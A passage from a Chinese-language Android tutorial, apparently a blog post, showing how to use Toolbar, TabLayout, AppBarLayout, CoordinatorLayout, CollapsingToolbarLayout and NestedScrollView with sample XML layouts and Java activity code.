android:id=\"@+id/share\"\n        android:icon=\"@mipmap/mine_login_account\"\n        android:orderInCategory=\"0\"\n        android:title=\"分享\"\n        />\n    <item\n        android:id=\"@+id/setting\"\n        android:icon=\"@mipmap/mine_login_account\"\n        android:orderInCategory=\"1\"\n        android:title=\"设置\"\n        />\n    <item\n        android:id=\"@+id/cancle\"\n        android:icon=\"@mipmap/mine_login_account\"\n        android:orderInCategory=\"2\"\n        android:title=\"取消\"\n        />\n</menu>\n\n效果图如下：\n\n\n\n\n\nToolBar\n\nToolBar是谷歌在Android5.0的时候推出的，是在V7包中，是为了替换之前的ActionBar，Toolbar的出现解决了Actionbar的各种限制，Toolbar可以完全自定义和配置，下面详细说明一下具体使用。\n\n为了能在你的Activity中使用Toolbar，你必须在工程里修改styles.xml文件里的主题风格，系统默认如下\n\n\n\n<style name=\"AppTheme\" parent=\"Theme.AppCompat.Light.DarkActionBar\">\n\n这种Theme表示使用系统之前的ActionBar，那么我们想要使用Toolbar怎么办呢？使用下面这个主题。\n\n\n\n<style name=\"AppTheme\" parent=\"Theme.AppCompat.Light.NoActionBar\">\n\n下面具体来说一下Toolba的使用\n\n主题文件：\n\n\n\n<style name=\"AppThemeA\" parent=\"Theme.AppCompat.Light.NoActionBar\">\n        <!--导航栏底色-->\n        <item name=\"colorPrimary\">@color/colorPrimary</item>\n        <!--状态栏的颜色-->\n        <item name=\"colorPrimaryDark\">#0000ff</item>\n        <!--导航栏上的标题颜色-->\n        <item name=\"android:textColorPrimary\">#FF4081</item>\n        <!--Activity窗口的背景颜色-->\n        <item name=\"android:windowBackground\">@color/highlighted_text_material_dark</item>\n\n        <!--按钮选中或者点击获得焦点后的颜色-->\n        <item name=\"colorAccent\">#00ff00</item>\n        <!--和 colorAccent相反，正常状态下按钮的颜色-->\n        <item name=\"colorControlNormal\">#ff0000</item>\n        <!--Button按钮正常状态颜色-->\n        <item name=\"colorButtonNormal\">#00ff00</item>\n        <!--EditText 输入框中字体的颜色-->\n        <item name=\"editTextColor\">#00ff00</item>\n        <item name=\"android:textColorHint\">#00ff00</item>\n    </style>\n\nmanifests中使用此Style：\n\n\n\n<activity\n    android:name=\".ToolbarActivity\"\n    android:theme=\"@style/AppThemeA\"/>\n\n布局文件：\n\n\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    android:layout_width=\"match_parent\"\n    android:layout_height=\"match_parent\"\n    android:orientation=\"vertical\">\n    <!--actionBarSize默认高度是56dp&&colorPrimary对应颜色@color/colorPrimary-->\n    <android.support.v7.widget.Toolbar\n        android:id=\"@+id/toolbar\"\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"?attr/actionBarSize\"\n        android:background=\"?attr/colorPrimary\"></android.support.v7.widget.Toolbar>\n\n\n    <CheckBox\n        android:layout_width=\"wrap_content\"\n        android:layout_height=\"wrap_content\"\n        android:text=\"男\"\n        android:textColor=\"@android:color/white\" />\n\n    <CheckBox\n        android:layout_width=\"wrap_content\"\n        android:layout_height=\"wrap_content\"\n        android:text=\"男\"\n        android:textColor=\"@android:color/white\" />\n\n    <RadioGroup\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"wrap_content\">\n\n        <RadioButton\n            android:layout_width=\"wrap_content\"\n            android:layout_height=\"wrap_content\"\n            android:text=\"男\"\n            android:textColor=\"@android:color/white\" />\n\n        <RadioButton\n            android:layout_width=\"wrap_content\"\n            android:layout_height=\"wrap_content\"\n            android:text=\"男\"\n            android:textColor=\"@android:color/white\" />\n    </RadioGroup>\n\n    <android.support.v7.widget.SwitchCompat\n        android:layout_width=\"wrap_content\"\n        android:layout_height=\"wrap_content\"\n        android:text=\"男\"\n        android:textColor=\"@android:color/white\" />\n\n    <android.support.v7.widget.SwitchCompat\n        android:id=\"@+id/switchCompatBoy\"\n        android:layout_width=\"wrap_content\"\n        android:layout_height=\"wrap_content\"\n        android:text=\"女\"\n        android:textColor=\"@android:color/white\" />\n\n    <EditText\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"wrap_content\"\n        android:hint=\"请输入密码\" />\n\n    <Button\n        android:id=\"@+id/button\"\n        android:layout_width=\"wrap_content\"\n        android:layout_height=\"wrap_content\"\n        android:text=\"模式切换\" />\n\n</LinearLayout>\n\nRes下menu文件夹中的menu文件：\n\n\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<menu xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:app=\"http://schemas.android.com/apk/res-auto\">\n\n    <item\n        android:id=\"@+id/action_edit\"\n        android:icon=\"@drawable/abc_ic_menu_share_mtrl_alpha\"\n        android:orderInCategory=\"0\"\n        android:title=\"A\"\n        app:showAsAction=\"always\" />\n\n    <item\n        android:id=\"@+id/action_share\"\n        android:icon=\"@drawable/abc_ic_menu_share_mtrl_alpha\"\n        android:orderInCategory=\"2\"\n        android:title=\"B\"\n        app:showAsAction=\"always\" />\n\n    <item\n        android:id=\"@+id/action_settings\"\n        android:orderInCategory=\"3\"\n        android:title=\"C\"\n        app:showAsAction=\"never\" />\n\n    <item\n        android:id=\"@+id/action_other\"\n        android:icon=\"@drawable/abc_ic_menu_share_mtrl_alpha\"\n        android:orderInCategory=\"4\"\n        android:title=\"D\"\n        app:showAsAction=\"never\" />\n</menu>\n\njava代码中调用\n\n\n\npublic class ToolbarActivity extends AppCompatActivity implements Toolbar.OnMenuItemClickListener {\n    Toolbar toolbar;\n    Button button;\n    SwitchCompat switchCompatBoy;\n\n    @Override\n    protected void onCreate(@Nullable Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_titlebar);\n        button = (Button) findViewById(R.id.button);\n        toolbar = (Toolbar) findViewById(R.id.toolbar);\n        switchCompatBoy = (SwitchCompat) findViewById(R.id.switchCompatBoy);\n        setSupportActionBar(toolbar);\n//        上面代码用来隐藏系统默认的Title。\n        getSupportActionBar().setDisplayShowTitleEnabled(false);\n        toolbar.setTitle(\"主标题\");\n        toolbar.setSubtitle(\"副标题\");\n        toolbar.setSubtitleTextColor(getResources().getColor(R.color.colorAccent));\n        toolbar.setLogo(R.mipmap.mine_login_account);\n        toolbar.setNavigationIcon(android.R.drawable.ic_notification_clear_all);\n        toolbar.setNavigationOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View view) {\n                finish();\n            }\n        });\n\n        toolbar.setOnMenuItemClickListener(this);\n\n        button.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View view) {\n                Toast.makeText(ToolbarActivity.this, \"aaa\", Toast.LENGTH_SHORT).show();\n            }\n        });\n\n        switchCompatBoy.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {\n            @Override\n            public void onCheckedChanged(CompoundButton compoundButton, boolean b) {\n                if (b) {\n                    Toast.makeText(ToolbarActivity.this, \"checked\", Toast.LENGTH_SHORT).show();\n                } else {\n                    Toast.makeText(ToolbarActivity.this, \"no checked\", Toast.LENGTH_SHORT).show();\n                }\n            }\n        });\n    }\n\n    @Override\n    public boolean onCreateOptionsMenu(Menu menu) {\n        getMenuInflater().inflate(R.menu.menu_titlebar, menu);\n        return super.onCreateOptionsMenu(menu);\n    }\n\n    @Override\n    public boolean onMenuItemClick(MenuItem item) {\n        switch (item.getItemId()) {\n            case R.id.action_edit:\n                Toast.makeText(ToolbarActivity.this, \"查找按钮\", Toast.LENGTH_SHORT).show();\n                break;\n            case R.id.action_share:\n                Toast.makeText(ToolbarActivity.this, \"分享按钮\", Toast.LENGTH_SHORT).show();\n                break;\n        }\n        return false;\n    }\n}\n\n效果如下：\n\n\n\n上面就是程序部分，里面有很清楚的注释，Toolbar可以自定义，这个在新建的带侧边栏的Activity中就有，这里不多说明，这里以一张图片来说明上面为什么是这种效果。 \n\n\n\n\n1. colorPrimary: Toolbar导航栏的底色。 \n1. colorPrimaryDark：状态栏的底色，注意这里只支持Android5.0以上的手机。 \n1. textColorPrimary：整个当前Activity的字体的默认颜色。 \n1. android:windowBackground：当前Activity的窗体颜色。 \n1. colorAccent：CheckBox，RadioButton，SwitchCompat等控件的点击选中颜色 \n1. colorControlNormal：CheckBox，RadioButton，SwitchCompat等默认状态的颜色。 \n1. colorButtonNormal：默认状态下Button按钮的颜色。 \n1. editTextColor：默认EditView输入框字体的颜色。\n\n参考文章链接：http://blog.csdn.net/feiduclear_up/article/details/46457433\n\n\n\nTabLayout(选项卡布局)\n\n实现Tabs选项卡的效果有很多方法，例如，我一般使用PageSlidingTab来完成，但是，现在谷歌中有一个TabLayout，我们以后直接就可以使用此布局来直接完成选项卡的效果，不管是使用自定义的View还是使用谷歌给的TabLayout，他们都是继承自HorizontalScrollView的。\n\n先看一下效果： \n\n\n布局activity_tablayout.xml:\n\n\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n    android:layout_width=\"match_parent\"\n    android:layout_height=\"match_parent\"\n    android:orientation=\"vertical\">\n\n    <android.support.design.widget.TabLayout\n        android:id=\"@+id/tab\"\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"40dp\"\n        app:tabBackground=\"@color/colorAccent\"\n        app:tabIndicatorColor=\"@android:color/holo_blue_bright\"\n        app:tabMode=\"scrollable\"\n        app:tabSelectedTextColor=\"@android:color/holo_blue_bright\"\n        app:tabTextColor=\"@android:color/white\"\n        ></android.support.design.widget.TabLayout>\n\n    <android.support.v4.view.ViewPager\n        android:id=\"@+id/vpContent\"\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"match_parent\"></android.support.v4.view.ViewPager>\n</LinearLayout>\n\n布局文件很简单，只有TabLayout和ViewPager两个控件，但在使用TabLayout的属性的时候，需要引入命名空间 xmlns:app=”http://schemas.android.com/apk/res-auto”。\n\nAdapter代码TabFragmentAdapter.java：\n\n\n\npublic class TabFragmentAdapter extends FragmentStatePagerAdapter {\n\n    private List<Fragment> mFragments;\n    private List<String> mTitles;\n\n    public TabFragmentAdapter(FragmentManager fm,List<Fragment> mFragments,List<String> mTitles) {\n        super(fm);\n        this.mFragments = mFragments;\n        this.mTitles = mTitles;\n    }\n\n    @Override\n    public Fragment getItem(int position) {\n        return mFragments.get(position);\n    }\n\n    @Override\n    public int getCount() {\n        return mFragments.size();\n    }\n\n    @Override\n    public CharSequence getPageTitle(int position) {\n        return mTitles.get(position);\n    }\n}\n\n主程序TabLayoutActivity.java\n\n\n\npublic class TabLayoutActivity extends AppCompatActivity {\n\n    TabLayout tab;\n    ViewPager vpContent;\n    List<Fragment> fragmentList;\n    List<String> mTitles;\n    TabFragmentAdapter mTabFragmentAdapter;\n\n    @Override\n    protected void onCreate(@Nullable Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_tablayout);\n        tab = (TabLayout) findViewById(R.id.tab);\n\n        vpContent = (ViewPager) findViewById(R.id.vpContent);\n        fragmentList = new ArrayList<>();\n        mTitles = new ArrayList<>();\n\n        mTitles.add(\"one\");\n        mTitles.add(\"two\");\n        mTitles.add(\"three\");\n        mTitles.add(\"four\");\n        mTitles.add(\"five\");\n        mTitles.add(\"six\");\n        mTitles.add(\"severn\");\n        mTitles.add(\"eight\");\n        mTitles.add(\"night\");\n        mTitles.add(\"ten\");\n\n        tab.addTab(tab.newTab().setText(mTitles.get(0)));\n        tab.addTab(tab.newTab().setText(mTitles.get(1)));\n        tab.addTab(tab.newTab().setText(mTitles.get(2)));\n        tab.addTab(tab.newTab().setText(mTitles.get(3)));\n        tab.addTab(tab.newTab().setText(mTitles.get(4)));\n        tab.addTab(tab.newTab().setText(mTitles.get(5)));\n        tab.addTab(tab.newTab().setText(mTitles.get(6)));\n        tab.addTab(tab.newTab().setText(mTitles.get(7)));\n        tab.addTab(tab.newTab().setText(mTitles.get(8)));\n        tab.addTab(tab.newTab().setText(mTitles.get(9)));\n        for (int i = 0; i < mTitles.size(); i++) {\n            fragmentList.add(TabFragment.newInstance(\"hello \" + mTitles.get(i)));\n        }\n        mTabFragmentAdapter = new TabFragmentAdapter(getSupportFragmentManager(), fragmentList, mTitles);\n        vpContent.setAdapter(mTabFragmentAdapter);\n        tab.setupWithViewPager(vpContent);\n    }\n}\n\n\n主程序中用到的TabFragment.java程序就非常简单了，通过效果图就知道怎么做了，这里就不多说明了。\n\n\n\n-说明：\n\nTabLayout常用的属性有：\n\n\napp:tabSelectedTextColor：Tab被选中字体的颜色\napp:tabTextColor：Tab未被选中字体的颜色\napp:tabIndicatorColor：Tab指示器下标的颜色\n\n\nTabLayout常用的方法如下：  \n- addTab(TabLayout.Tab tab, int position, boolean setSelected) 增加选项卡到 layout 中  \n- addTab(TabLayout.Tab tab, boolean setSelected) 同上  \n- addTab(TabLayout.Tab tab) 同上  \n- getTabAt(int index) 得到选项卡  \n- getTabCount() 得到选项卡的总个数  \n- getTabGravity() 得到 tab 的 Gravity  \n- getTabMode() 得到 tab 的模式  \n- getTabTextColors() 得到 tab 中文本的颜色  \n- newTab() 新建个 tab  \n- removeAllTabs() 移除所有的 tab  \n- removeTab(TabLayout.Tab tab) 移除指定的 tab  \n- removeTabAt(int position) 移除指定位置的 tab  \n- setOnTabSelectedListener(TabLayout.OnTabSelectedListener onTabSelectedListener) 为每个 tab 增加选择监听器  \n- setScrollPosition(int position, float positionOffset, boolean updateSelectedText) 设置滚动位置  \n- setTabGravity(int gravity) 设置 Gravity  \n- setTabMode(int mode) 设置 Mode,有两种值：TabLayout.MODE_SCROLLABLE和TabLayout.MODE_FIXED分别表示当tab的内容超过屏幕宽度是否支持横向水平滑动，第一种支持滑动，第二种不支持，默认不支持水平滑动。  \n- setTabTextColors(ColorStateList textColor) 设置 tab 中文本的颜色  \n- setTabTextColors(int normalColor, int selectedColor) 设置 tab 中文本的颜色 默认 选中  \n- setTabsFromPagerAdapter(PagerAdapter adapter) 设置 PagerAdapter  \n- setupWithViewPager(ViewPager viewPager) 和 ViewPager 联动 \n\n最后要强调的是，TabLayout要配合Theme.AppCompat。。。。。。来使用，否则会报错的哦，不明白的可以试一下\n\n\n\nAppBarLayout（程序栏布局）&&CoordinatorLayout（协作布局）\n\nAppBarLayout继承自LinearLayout，它是为了Material Design设计的App Bar，支持手势滑动操作，默认的AppBarLayout是垂直方向的，它的作用是把AppBarLayout包裹的内容都作为AppBar，AppBarLayout是支持手势滑动效果的，不过要跟CoordinatorLayout配合使用。\n\n从源码可以看到，CoordinatorLayout是一个增强型的FrameLayout。它的作用有两个：\n\n\n作为一个布局的根布局\n作为一个子视图之间相互协调手势效果的一个协调布局\n\n\n首先来看布局文件layout_appbar.xml\n\n\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<android.support.design.widget.CoordinatorLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n    android:id=\"@+id/coor_main\"\n    android:layout_width=\"match_parent\"\n    android:layout_height=\"match_parent\">\n\n    <android.support.design.widget.AppBarLayout\n        android:id=\"@+id/appbar\"\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"wrap_content\">\n\n        <android.support.v7.widget.Toolbar\n            android:id=\"@+id/toolbar\"\n            android:layout_width=\"match_parent\"\n            android:layout_height=\"?attr/actionBarSize\"\n            android:background=\"?attr/colorPrimary\"\n            app:layout_scrollFlags=\"scroll|enterAlways\">\n\n        </android.support.v7.widget.Toolbar>\n\n        <android.support.design.widget.TabLayout\n            android:id=\"@+id/tabs\"\n            android:layout_width=\"match_parent\"\n            android:layout_height=\"wrap_content\"\n            app:tabGravity=\"fill\"\n            app:tabIndicatorColor=\"@color/colorAccent\"\n            app:tabSelectedTextColor=\"@color/colorAccent\"\n            app:tabTextColor=\"@color/colorPrimary\"></android.support.design.widget.TabLayout>\n\n    </android.support.design.widget.AppBarLayout>\n    <!--可滑动的布局内容-->\n    <android.support.v4.view.ViewPager\n        android:id=\"@+id/vpContent\"\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"match_parent\"\n        app:layout_behavior=\"@string/appbar_scrolling_view_behavior\" />\n</android.support.design.widget.CoordinatorLayout>\n\n说明：\n\nCoordinatorLayout协调布局中包裹了两个布局，一个是ViewPager，一个是AppBarLayout\n\n我们来看看CoordinatorLayout是怎么来协调这两个子视图手势操作的:\n\n1.由于CoordinatorLayout是FrameLayout布局，我们可以通过\n\n\n\nandroid:layout_gravity=\"bottom|end\"\n\n属性来控制组件在整个布局中的位置。\n\n2.为了达到上面效果图的手势动画效果，我们必须做如下设置，通过app:layout_scrollFlags=”scroll|enterAlways” 属性来确定哪个组件是可滑动的\n\n设置的layout_scrollFlags有如下几种选项：\n\n\nscroll: 所有想滚动出屏幕的view都需要设置这个flag- 没有设置这个flag的view将被固定在屏幕顶部。\nenterAlways: 这个flag让任意向下的滚动都会导致该view变为可见，启用快速“返回模式”。\nenterAlwaysCollapsed: 当你的视图已经设置minHeight属性又使用此标志时，你的视图只能已最小高度进入，只有当滚动视图到达顶部时才扩大到完整高度。\nexitUntilCollapsed: 滚动退出屏幕，最后折叠在顶端。\n\n\n我们上面的布局中 给Toolbar设置了app:layout_scrollFlags属性，因此，Toolbar是可以滚动出屏幕，且向下滚动有可以出现。\n\n3.为了使得Toolbar可以滑动，我们必须还得有个条件，就是CoordinatorLayout布局下包裹一个可以滑动的布局，比如 RecyclerView，NestedScrollView(经过测试，ListView，ScrollView不支持)具有滑动效果的组件。并且给这些组件设置如下属性来告诉CoordinatorLayout，该组件是带有滑动行为的组件，然后CoordinatorLayout在接受到滑动时会通知AppBarLayout 中可滑动的Toolbar可以滑出屏幕了。\n\n\n\napp:layout_behavior=\"@string/appbar_scrolling_view_behavior\"\n\n4.实际开发中发现一个问题，当AppBarLayout的高度太高的时，滑动也是有问题的，不懂的码友可以试试。\n\n主程序：AppBarLayoutActivity.java：\n\n\n\npublic class AppBarLayoutActivity extends AppCompatActivity {\n\n    private CoordinatorLayout coor_main;\n    private AppBarLayout appbar;\n    private Toolbar toolbar;\n    private TabLayout tab;\n    private ViewPager vpContent;\n    List<Fragment> fragmentList;\n    List<String> mTitles;\n    TabFragmentAdapter mTabFragmentAdapter;\n\n    @Override\n    protected void onCreate(@Nullable Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.layout_appbar);\n        coor_main = (CoordinatorLayout) findViewById(R.id.coor_main);\n        appbar = ((AppBarLayout) findViewById(R.id.appbar));\n        toolbar = ((Toolbar) findViewById(R.id.toolbar));\n        tab = ((TabLayout) findViewById(R.id.tabs));\n        vpContent = ((ViewPager) findViewById(R.id.vpContent));\n        initToolBar();\n        initTab();\n    }\n\n    private void initToolBar() {\n        setSupportActionBar(toolbar);\n        getSupportActionBar().setDisplayShowTitleEnabled(false);\n        toolbar.setTitle(\"风清扬\");\n        toolbar.setLogo(R.mipmap.ic_launcher);\n    }\n\n    private void initTab() {\n        fragmentList = new ArrayList<>();\n        mTitles = new ArrayList<>();\n\n        mTitles.add(\"one\");\n        mTitles.add(\"two\");\n        mTitles.add(\"three\");\n        mTitles.add(\"four\");\n\n        tab.addTab(tab.newTab().setText(mTitles.get(0)));\n        tab.addTab(tab.newTab().setText(mTitles.get(1)));\n        tab.addTab(tab.newTab().setText(mTitles.get(2)));\n        tab.addTab(tab.newTab().setText(mTitles.get(3)));\n        for (int i = 0; i < mTitles.size(); i++) {\n            fragmentList.add(AppBarFragment.newInstance(\"\"+i));\n        }\n        mTabFragmentAdapter = new TabFragmentAdapter(getSupportFragmentManager(), fragmentList, mTitles);\n        vpContent.setAdapter(mTabFragmentAdapter);\n        tab.setupWithViewPager(vpContent);\n    }\n}\n\n\n说明： \n因为用到了ToolBar，所以需要去掉APP中默认的ActionBar，即需要给此Activity添加theme，如下\n\n\n\n<style name=\"AppThemeB\" parent=\"Theme.AppCompat.Light.NoActionBar\"></style>\n\n里面别的代码都比较简单，将会在下面奉上源代码。\n\n总结： 为了使得Toolbar有滑动效果，必须做到如下三点：\n\n\nCoordinatorLayout必须作为整个布局的父布局容器。\n给需要滑动的组件设置 app:layout_scrollFlags=”scroll|enterAlways” 属性。\n给你的可滑动的组件，也就是RecyclerView 或者 NestedScrollView 设置如下属性： \napp:layout_behavior=”@string/appbar_scrolling_view_behavior”\n\n\n\n\nCollapsingToolbarLayout（折叠工具栏布局）\n\nCollapsingToolbarLayout包裹 Toolbar 的时候提供一个可折叠的 Toolbar，一般作为AppbarLayout的子视图使用。\n\n效果如下： \n\n\n布局文件activity_collapsing.xml:\n\n\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<android.support.design.widget.CoordinatorLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n    android:layout_width=\"match_parent\"\n    android:layout_height=\"match_parent\"\n    android:orientation=\"vertical\">\n\n    <android.support.design.widget.AppBarLayout\n        android:id=\"@+id/appbar\"\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"160dp\">\n\n        <android.support.design.widget.CollapsingToolbarLayout\n            android:id=\"@+id/collapsing_toolbar\"\n            android:layout_width=\"match_parent\"\n            android:layout_height=\"match_parent\"\n            app:contentScrim=\"?attr/colorPrimary\"\n            app:expandedTitleMarginEnd=\"64dp\"\n            app:expandedTitleMarginStart=\"48dp\"\n            app:layout_scrollFlags=\"scroll|exitUntilCollapsed\"\n            app:statusBarScrim=\"?attr/colorPrimary\"\n\n            >\n\n            <ImageView\n                android:id=\"@+id/image\"\n                android:layout_width=\"match_parent\"\n                android:layout_height=\"match_parent\"\n                android:scaleType=\"fitXY\"\n                android:src=\"@mipmap/html5\"\n                app:layout_collapseMode=\"parallax\"\n                app:layout_collapseParallaxMultiplier=\"0.6\" />\n\n            <android.support.v7.widget.Toolbar\n                android:id=\"@+id/toolbar\"\n                android:layout_width=\"match_parent\"\n                android:layout_height=\"?attr/actionBarSize\"\n                app:layout_collapseMode=\"pin\"\n                >\n                <TextView\n                    android:layout_width=\"match_parent\"\n                    android:layout_height=\"match_parent\"\n                    android:gravity=\"left|center_vertical\"\n                    android:textColor=\"#ffffff\"\n                    android:text=\"自定义标题\"\n\n                    />\n            </android.support.v7.widget.Toolbar>\n        </android.support.design.widget.CollapsingToolbarLayout>\n    </android.support.design.widget.AppBarLayout>\n\n    <!--可滑动的内容-->\n    <android.support.v4.widget.NestedScrollView\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"wrap_content\"\n        app:layout_behavior=\"@string/appbar_scrolling_view_behavior\">\n\n        <LinearLayout\n            android:layout_width=\"match_parent\"\n            android:layout_height=\"match_parent\"\n            android:orientation=\"vertical\">\n\n            <Button\n                android:layout_width=\"match_parent\"\n                android:layout_height=\"match_parent\"\n                android:layout_margin=\"5dp\"\n                android:text=\"one\" />\n\n        ......若干个button......\n\n        </LinearLayout>\n    </android.support.v4.widget.NestedScrollView>\n</android.support.design.widget.CoordinatorLayout>\n\n\n主程序CollapsingToolbarLayoutActivity.java：\n\n\n\npublic class CollapsingToolbarLayoutActivity extends AppCompatActivity {\n    private Toolbar toolbar;\n    private CollapsingToolbarLayout collapsingToolbar;\n\n    @Override\n    protected void onCreate(@Nullable Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_collapsing);\n        toolbar = (Toolbar) findViewById(R.id.toolbar);\n        setSupportActionBar(toolbar);\n        getSupportActionBar().setDisplayShowTitleEnabled(false);\n        getSupportActionBar().setDisplayHomeAsUpEnabled(true);\n        collapsingToolbar = (CollapsingToolbarLayout) findViewById(R.id.collapsing_toolbar);\n//        collapsingToolbar.setTitle(\"bruce常\");\n    }\n\n    @Override\n    public boolean onOptionsItemSelected(MenuItem item) {\n        if (item.getItemId() == android.R.id.home) {\n\n            Toast.makeText(this, \"aaa\", Toast.LENGTH_SHORT).show();\n            return true;\n        }\n        return super.onOptionsItemSelected(item);\n    }\n}\n\n\n说明：\n\nCollapsingToolbarLayout 提供以下属性和方法是用：\n\n\nCollapsing title：ToolBar的标题，当CollapsingToolbarLayout全屏没有折叠时，title显示的是大字体，在折叠的过程中，title不断变小到一定大小的效果。你可以调用setTitle(CharSequence)方法设置title。\nContent scrim：ToolBar被折叠到顶部固定时候的背景，你可以调用setContentScrim(Drawable)方法改变背景或者 在属性中使用 app:contentScrim=”?attr/colorPrimary”来改变背景。\nStatus bar scrim：状态栏的背景，调用方法setStatusBarScrim(Drawable)。还没研究明白，不过这个只能在Android5.0以上系统有效果。\nParallax scrolling children：CollapsingToolbarLayout滑动时，子视图的视觉差，可以通过属性app:layout_collapseParallaxMultiplier=”0.6”改变。\nCollapseMode ：子视图的折叠模式，有两种“pin”：固定模式，在折叠的时候最后固定在顶端；“parallax”：视差模式，在折叠的时候会有个视差折叠的效果。我们可以在布局中使用属性app:layout_collapseMode=”parallax”来改变。\n\n\n特别注意的是要使用NoActionBar的主题，且AppBarLayout的布局超过手机屏幕的时候，滑动也是有问题的。 \n\n\n\nNestedScrollView的使用:\n\nNestedScrollView是support-v4包提供的控件,继承至FrameLayout,  \n并实现了NestedScrollingParent,NestedScrollingChild, ScrollingView接口.  \n它的作用类似于Android.widget.ScrollView,不同点在于NestedScrollView支持嵌套滑动.\n\n效果图如下：\n\n\n\n布局文件activity_netscroll.xml：\n\n\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<android.support.design.widget.CoordinatorLayout\n    android:id=\"@+id/main_content\"\n    xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n    xmlns:tools=\"http://schemas.android.com/tools\"\n    android:layout_width=\"match_parent\"\n    android:layout_height=\"match_parent\"\n    tools:context=\".NestedScrollViewActivity\">\n\n\n    <android.support.design.widget.AppBarLayout\n        android:id=\"@+id/appbar\"\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"wrap_content\">\n        <!--标题栏-->\n        <android.support.v7.widget.Toolbar\n            android:id=\"@+id/toolbar\"\n            android:layout_width=\"match_parent\"\n            android:layout_height=\"?attr/actionBarSize\"\n            android:background=\"?attr/colorPrimary\"\n            app:layout_scrollFlags=\"scroll|enterAlways\">\n\n            <TextView\n                android:layout_width=\"wrap_content\"\n                android:layout_height=\"match_parent\"\n                android:layout_gravity=\"center\"\n                android:gravity=\"center\"\n                android:text=\"自定义标题\"/>\n        </android.support.v7.widget.Toolbar>\n        <!--大图-->\n        <ImageView\n            android:layout_width=\"match_parent\"\n            android:layout_height=\"200dp\"\n            android:background=\"@mipmap/html5\"\n\n            />\n        <!--选项卡-->\n        <android.support.design.widget.TabLayout\n            android:id=\"@+id/tabLayout\"\n            android:layout_width=\"match_parent\"\n            android:layout_height=\"wrap_content\"\n            android:background=\"#80ffffff\"\n            app:tabIndicatorColor=\"@color/colorAccent\"\n            app:tabMode=\"scrollable\"\n            app:tabSelectedTextColor=\"@color/colorAccent\"\n            app:tabTextColor=\"@android:color/black\"/>\n    </android.support.design.widget.AppBarLayout>\n\n    <android.support.v4.widget.NestedScrollView\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"wrap_content\"\n        android:overScrollMode=\"never\"\n        app:layout_behavior=\"@string/appbar_scrolling_view_behavior\">\n\n        <LinearLayout\n            android:id=\"@+id/ll_sc_content\"\n            android:layout_width=\"match_parent\"\n            android:layout_height=\"wrap_content\"\n            android:orientation=\"vertical\">\n        </LinearLayout>\n    </android.support.v4.widget.NestedScrollView>\n</android.support.design.widget.CoordinatorLayout>\n\n主程序NestedScrollViewActivity.java：\n\n\n\npublic class NestedScrollViewActivity extends AppCompatActivity {\n    List<String> mData;\n    @Override\n    protected void onCreate(@Nullable Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_netscroll);\n        initData(1);\n        initView();\n    }\n\n    private void initData(int pager) {\n        mData = new ArrayList<>();\n        for (int i = 1; i < 50; i++) {\n            mData.add(\"pager\" + pager + \" 第\" + i + \"个item\");\n        }\n    }\n\n    private void initView() {\n        //设置ToolBar\n        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);\n        toolbar.setTitle(\"\");\n        toolbar.setNavigationIcon(R.mipmap.ic_launcher);\n        setSupportActionBar(toolbar);//替换系统的actionBar\n\n        //设置TabLayout\n        TabLayout tabLayout = (TabLayout) findViewById(R.id.tabLayout);\n        for (int i = 1; i < 20; i++) {\n            tabLayout.addTab(tabLayout.newTab().setText(\"TAB\" + i));\n        }\n        //TabLayout的切换监听\n        tabLayout.setOnTabSelectedListener(new TabLayout.OnTabSelectedListener() {\n            @Override\n            public void onTabSelected(TabLayout.Tab tab) {\n                initData(tab.getPosition() + 1);\n                setScrollViewContent();\n            }\n\n            @Override\n            public void onTabUnselected(TabLayout.Tab tab) {\n\n            }\n\n            @Override\n            public void onTabReselected(TabLayout.Tab tab) {\n\n            }\n        });\n        setScrollViewContent();\n    }\n\n    /**\n     * 刷新ScrollView的内容\n     */\n    private void setScrollViewContent() {\n        //NestedScrollView下的LinearLayout\n        LinearLayout layout = (LinearLayout) findViewById(R.id.ll_sc_content);\n        layout.removeAllViews();\n        for (int i = 0; i < mData.size(); i++) {\n            View view = View.inflate(NestedScrollViewActivity.this, R.layout.adapter_appbar, null);\n            ((TextView) view.findViewById(R.id.text)).setText(mData.get(i));\n            //动态添加 子View\n            layout.addView(view, i);\n        }\n    }\n\n}\n\n\n5.0中的新特性基本上就这么多，希望以后开发中多多使用。\n\n本篇文章源码下载地址：点我\n\n欢迎访问201216323.tech来查看我的CSDN博客。\n\n欢迎关注我的个人技术公众号,快速查看我的最新文章。\n\n\n\n参考链接： \n1. 